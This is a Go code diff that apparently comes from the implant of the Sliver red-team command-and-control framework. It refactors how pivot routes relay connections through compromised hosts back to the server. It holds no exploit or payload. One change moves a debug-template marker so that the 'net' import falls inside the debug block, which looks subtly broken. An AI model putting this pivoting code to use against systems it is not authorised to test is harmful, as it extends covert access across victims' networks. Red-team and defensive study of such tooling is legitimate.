@@ -21,8 +21,9 @@ package handlers
 import (
 	// {{if .Config.Debug}}
 	"log"
-	// {{end}}
 	"net"
+
+	// {{end}}
 
 	"github.com/golang/protobuf/proto"
 
@@ -73,7 +74,6 @@ func addRouteHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 
 	routes := route.Routes
 	newRoute := addRouteReq.Route
-	var routeHandler func(conn net.Conn)
 
 	// If no routes yet, we need to register the mux router
 	// to the active transport's multiplexer session.
@@ -81,31 +81,13 @@ func addRouteHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 		routes.Server = route.SetupMuxRouter(transports.ServerComms.Multiplexer)
 	}
 
-	// If we are the last node in the chain, it means this implant is
-	// in the subnet where we want to route the traffic, and therefore
-	// we register a special handler that will directly dial other hosts.
-	if len(addRouteReq.Route.Nodes) == 1 {
-
-		// Set up stream handle function: we find the transport connected
-		// to next node in chain, and give it the conn to be handled.
-		routeHandler = func(conn net.Conn) {
-			for _, t := range transports.Transports.Active {
-				next := addRouteReq.Route.Nodes[1]
-				if t.URL.String() == next.Addr {
-					go t.HandleRouteStream(addRouteReq.Route.ID, conn)
-				}
-			}
-		}
-
-	} else {
-		// Else, use special handler for dialing the implant's subnet.
-		routeHandler = func(conn net.Conn) {
-			// Use function passing the new.Addr as a dest to dial, etc.
-		}
-	}
-
-	// Add handle func to Router.
-	routes.Server.Handle(bon.Route(addRouteReq.Route.ID), routeHandler)
+	// Forge and register the appropriate route handlers for this route.
+	// The handler is always redirected to the active server connection.
+	// The latter will determine by itself what to do with the conn, based
+	// on the route information provided with it.
+	routes.Server.Handle(bon.Route(newRoute.ID), func(conn net.Conn) {
+		go transports.ServerComms.HandleRouteConn(newRoute, conn)
+	})
 
 	// Add route to active routes.
 	routes.Add(addRouteReq.Route)
@@ -136,6 +118,7 @@ func removeRouteHandler(envelope *sliverpb.Envelope, connection *transports.Conn
 
 	// Remove handler from router
 	route.Routes.Server.Off(bon.Route(rmRouteReq.Route.ID))
+
 	// {{if .Config.Debug}}
 	log.Printf("Removed route (ID: %d)", rmRouteReq.Route.ID)
 	// {{end}}
